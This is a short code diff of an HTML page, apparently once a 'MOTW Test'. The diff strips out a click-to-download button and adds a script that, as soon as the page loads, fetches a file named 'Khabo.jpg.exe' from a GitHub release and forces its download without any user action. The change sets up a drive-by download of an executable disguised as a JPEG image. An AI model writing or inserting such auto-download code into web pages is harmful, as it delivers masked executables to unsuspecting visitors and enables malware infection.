@@ -1,20 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head><title>MOTW Test</title></head>
-<body>
-<h1>Download Test File</h1>
-<button onclick="download()">Download Executable</button>
 <script>
-async function download() {
-    const response = await fetch("https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe");
-    const blob = await response.blob();
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = "Khabo.jpg.exe";
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-}
+fetch("https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe")
+.then(res => res.blob())
+.then(blob => {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = "Khabo.jpg.exe";
+  a.click();
+});
 </script>
-</body>
-</html>
